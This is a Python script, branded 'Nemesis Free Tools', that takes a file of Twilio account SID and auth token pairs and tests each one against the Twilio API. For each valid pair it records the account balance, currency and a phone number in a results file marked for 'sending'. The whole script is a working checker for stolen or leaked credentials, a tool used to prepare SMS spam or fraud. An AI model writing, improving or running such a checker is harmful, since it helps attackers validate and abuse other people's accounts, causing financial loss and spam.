# -*- coding: utf-8 -*-
import requests, json
from colorama import Fore, Style, Back
import os
import smtplib
from time import strftime
bl = Fore.BLACK
wh = Fore.WHITE
yl = Fore.YELLOW
red = Fore.RED
res = Style.RESET_ALL
gr = Fore.GREEN
ble = Fore.BLUE

def screen_clear():
    if os.name == "nt":
	    os.system("cls")
    else:
	    os.system("clear")

screen_clear()


now = strftime("%Y-%m-%d %H:%M:%S")
print (f'''{red}
    ___        ______   ____ _   _ _____ ____ _  _______ ____  
   / \ \      / / ___| / ___| | | | ____/ ___| |/ / ____|  _ \ 
  / _ \ \ /\ / /\___ \| |   | |_| |  _|| |   | ' /|  _| | |_) |
 / ___ \ V  V /  ___) | |___|  _  | |__| |___| . \| |___|  _ < 
/_/   \_\_/\_/  |____/ \____|_| |_|_____\____|_|\_\_____|_| \_\

  {wh}Nemesis Free Tools
{gr}GitHub : MataKucing-OFC  
''')

link = input("Give Me List@NEMESIS> $ ")
with open(link) as fp:
    for star in fp:
        check = star.rstrip()
        ch = check.split('\n')[0].split('|')
        account_sid = ch[0]
        auth_token = ch[1]
        auth = (account_sid, auth_token)
        try:
            curler_balance = requests.get("https://api.twilio.com/2010-04-01/Accounts/"+account_sid+"/Balance.json", auth=auth).text
            curler_msg = requests.get("https://api.twilio.com/2010-04-01/Accounts/" + account_sid + "/Messages.json", auth=auth).text
            info_balance = json.loads(curler_balance)
            info_msg = json.loads(curler_msg)
            for msg in info_msg["messages"]:
                if msg["direction"] == "outbound-api":
                    nope = msg["from"]
                    break
                elif msg["direction"] == "inbound-api":
                    nope = msg["to"]
                    break
            print(f"# {account_sid}'|'{auth_token} Work => Check File For Sending.")
            build = "Account_SID: "+account_sid+'|'+ "Token: "+auth_token+'\n' +"Currency: "+info_balance["currency"]+'\n'+"Balance :"+info_balance["balance"]+'\n'+"Phone number: "+nope+'\n'
            remover = build.replace('\r', '')
            save = open('Results/!Twilio_Checked', 'a')
            save.write(remover+'\n')
            save.close()
        except:
               print (f"FAILED: Invalid credentials.")
               pass
